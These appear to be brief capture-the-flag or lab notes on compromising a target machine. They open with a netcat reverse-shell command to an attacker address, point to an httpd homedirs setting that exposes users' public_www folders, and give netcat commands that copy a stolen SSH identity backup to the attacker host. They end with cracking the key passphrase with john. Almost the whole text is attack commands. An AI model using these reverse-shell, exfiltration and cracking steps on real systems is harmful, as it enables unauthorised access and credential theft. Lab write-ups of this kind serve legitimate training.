nc -e /bin/sh 10.10.14.195 9001
shell used ^

the httpd conf file contains this:
# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www

which essentially means that there is a public_www dir within the users home dir.

the public thing holds an ssh dir that needs to be sent back, so you can use netcat using the below command sequence:

client -> nc -l -p 9000 > backup-ssh-identity-files.tgz
server -> nc 10.10.14.195 9000 < backup-ssh-identity-files.tgz

after running john on the ssh key, we get the password of hunter for the key allowing us to ssh in
